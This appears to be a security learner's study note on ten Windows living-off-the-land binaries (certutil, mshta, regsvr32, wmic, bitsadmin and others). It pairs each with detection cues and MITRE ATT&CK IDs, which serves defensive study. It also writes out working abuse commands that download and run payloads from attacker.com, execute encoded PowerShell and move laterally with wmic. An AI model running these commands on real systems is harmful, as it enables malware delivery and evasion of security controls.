# Day 37 — LOLBAS Reference: 10 Binaries
 
**Date:** 2026-06-28
**Source:** lolbas-project.github.io
 
---
 
## 1. certutil.exe
 
**Legitimate purpose:** Certificate utility — manages certificates, certificate stores, and certificate policies on Windows. IT uses it to import/export certificates and verify certificate chains.
 
**How attackers abuse it:** Download files from the internet. certutil can fetch files from URLs using its `-urlcache` flag, and since it's a trusted Windows binary, many network security tools don't flag its outbound connections.
 
**Malicious command:**
```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```
 
**Suspicious arguments:** `-urlcache`, `-split`, `-f` followed by an HTTP/HTTPS URL, destination path in Temp or AppData
 
**Expected process tree (malicious):**
```
cmd.exe or powershell.exe
  └── certutil.exe -urlcache -split -f http://[IP]/payload.exe C:\Temp\payload.exe
```
 
**MITRE ATT&CK:** T1105 — Ingress Tool Transfer
 
---
 
## 2. mshta.exe
 
**Legitimate purpose:** Microsoft HTML Application Host — runs `.hta` files, which are HTML-based applications that can run scripts with elevated trust. Used by some legacy enterprise applications.
 
**How attackers abuse it:** Execute malicious scripts directly from URLs or inline VBScript/JScript. mshta can download and run code from an attacker-controlled URL in a single command.
 
**Malicious command:**
```cmd
mshta.exe http://attacker.com/payload.hta
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc [payload]""")
```
 
**Suspicious arguments:** Any URL as argument, inline vbscript: or javascript: protocol handlers
 
**Expected process tree (malicious):**
```
explorer.exe or office app
  └── mshta.exe http://attacker.com/payload.hta
        └── powershell.exe or cmd.exe [payload]
```
 
**MITRE ATT&CK:** T1218.005 — System Binary Proxy Execution: Mshta
 
---
 
## 3. regsvr32.exe
 
**Legitimate purpose:** Registers and unregisters OLE controls (DLLs and ActiveX controls) in the Windows registry. Used during software installation.
 
**How attackers abuse it:** Load and execute malicious DLLs or scripts. The "squiblydoo" technique uses regsvr32 to download and execute a scriptlet (.sct) file from a URL — bypasses application whitelisting because regsvr32 is a trusted binary.
 
**Malicious command:**
```cmd
regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```
 
**Suspicious arguments:** `/i:` pointing to a URL, `scrobj.dll` as the target, `/u` flag combined with a URL
 
**Expected process tree (malicious):**
```
cmd.exe
  └── regsvr32.exe /s /n /u /i:http://[IP]/payload.sct scrobj.dll
        └── [spawned payload process]
```
 
**MITRE ATT&CK:** T1218.010 — System Binary Proxy Execution: Regsvr32
 
---
 
## 4. wmic.exe
 
**Legitimate purpose:** Windows Management Instrumentation Command-line. Used by admins to query system information, manage processes, and configure Windows settings remotely.
 
**How attackers abuse it:** Execute processes, query system info for reconnaissance, move laterally to remote machines, and spawn other processes in a way that can evade logging (the spawned process appears as a child of WMI rather than a child of the attacker's process).
 
**Malicious commands:**
```cmd
# Reconnaissance
wmic.exe /node:localhost product get name,version
 
# Execute process (parent obfuscation)
wmic.exe process call create "powershell.exe -enc [payload]"
 
# Remote execution (lateral movement)
wmic.exe /node:[target IP] process call create "cmd.exe /c [command]"
```
 
**Suspicious arguments:** `process call create` with PowerShell or cmd payload, `/node:` pointing to remote IPs
 
**Expected process tree (malicious):**
```
[attacker process]
  └── wmic.exe process call create "powershell.exe -enc [payload]"
        └── WmiPrvSE.exe (WMI provider host)
              └── powershell.exe [payload]
```
 
Note: the PowerShell spawns from WmiPrvSE.exe, not the original attacker process — this is the parent obfuscation benefit.
 
**MITRE ATT&CK:** T1047 — Windows Management Instrumentation
 
---

## 5. msiexec.exe
 
**Legitimate purpose:** Windows Installer — installs, updates, and removes software packages (.msi files). Every software install on Windows uses this.
 
**How attackers abuse it:** Install malicious packages from URLs or execute arbitrary DLLs. msiexec can download and run .msi files directly from the internet, and since it's the standard installer, network activity from msiexec is often trusted.
 
**Malicious commands:**
```cmd
msiexec.exe /q /i http://attacker.com/payload.msi
msiexec.exe /y malicious.dll
```
 
**Suspicious arguments:** `/i` pointing to a URL, `/y` or `/z` flags (register/unregister DLL), `/q` (quiet mode — no UI)
 
**MITRE ATT&CK:** T1218.007 — System Binary Proxy Execution: Msiexec
 
---
 
## 6. rundll32.exe
 
**Legitimate purpose:** Runs DLL files by calling a specific exported function. Windows itself uses this constantly for built-in functionality.
 
**How attackers abuse it:** Execute malicious DLLs, load JavaScript from .dll files, or call functions from legitimate DLLs in unintended ways to execute code.
 
**Malicious command:**
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(""WScript.Shell"");w.run(""calc"");window.close()")
rundll32.exe shell32.dll,ShellExec_RunDLL http://attacker.com/payload.exe
```
 
**Suspicious arguments:** javascript: protocol, URLs as arguments, unusual DLL paths or function names
 
**MITRE ATT&CK:** T1218.011 — System Binary Proxy Execution: Rundll32
 
---
 
## 7. bitsadmin.exe
 
**Legitimate purpose:** Background Intelligent Transfer Service Admin — manages file transfers in the background. Windows Update uses BITS to download updates without affecting network performance.
 
**How attackers abuse it:** Download malicious files silently in the background. BITS transfers persist across reboots and can be scheduled — attackers use it for stealthy download and persistence.
 
**Malicious command:**
```cmd
bitsadmin.exe /transfer job1 http://attacker.com/payload.exe C:\Temp\payload.exe
bitsadmin.exe /create job1 && bitsadmin.exe /addfile job1 http://attacker.com/payload.exe C:\Temp\payload.exe && bitsadmin.exe /resume job1
```
 
**Suspicious arguments:** `/transfer` or `/addfile` pointing to external URLs, destination in Temp or AppData
 
**MITRE ATT&CK:** T1197 — BITS Jobs
 
---
 
## 8. cmstp.exe
 
**Legitimate purpose:** Microsoft Connection Manager Profile Installer — installs network connection manager profiles. Rarely used in modern environments.
 
**How attackers abuse it:** Execute arbitrary code via malicious INF files. Can also bypass UAC on older Windows versions.
 
**Malicious command:**
```cmd
cmstp.exe /ns /s malicious.inf
```
 
**Suspicious arguments:** Any .inf file from an unusual location, `/ns` flag (no setup wizard)
 
**MITRE ATT&CK:** T1218.003 — System Binary Proxy Execution: CMSTP
 
---
 
## 9. wscript.exe / cscript.exe
 
**Legitimate purpose:** Windows Script Host — runs VBScript and JScript files. wscript.exe runs scripts with a GUI, cscript.exe runs them in the command line.
 
**How attackers abuse it:** Execute malicious VBScript or JScript files. Often used in phishing — the malicious attachment is a `.vbs` or `.js` file that runs through wscript.
 
**Malicious command:**
```cmd
wscript.exe malicious.vbs
cscript.exe //E:jscript malicious.txt
```
 
**Suspicious arguments:** Any script file from Downloads, Temp, or AppData; `//E:` flag used to specify script engine for non-standard extensions
 
**Expected process tree (malicious):**
```
explorer.exe (user double-clicked the attachment)
  └── wscript.exe malicious.vbs
        └── cmd.exe or powershell.exe [payload]
```
 
**MITRE ATT&CK:** T1059.005 — Command and Scripting Interpreter: Visual Basic
 
---
 
## 10. odbcconf.exe
 
**Legitimate purpose:** ODBC Configuration utility — configures ODBC (database) data sources on Windows.
 
**How attackers abuse it:** Execute DLL files through the `/A` flag with the `REGSVR` action — similar to regsvr32 abuse but less monitored.
 
**Malicious command:**
```cmd
odbcconf.exe /A {REGSVR malicious.dll}
```
 
**Suspicious arguments:** `/A {REGSVR ...}` pointing to a non-standard DLL path, especially from Temp or AppData
 
**MITRE ATT&CK:** T1218.008 — System Binary Proxy Execution: Odbcconf
 
---

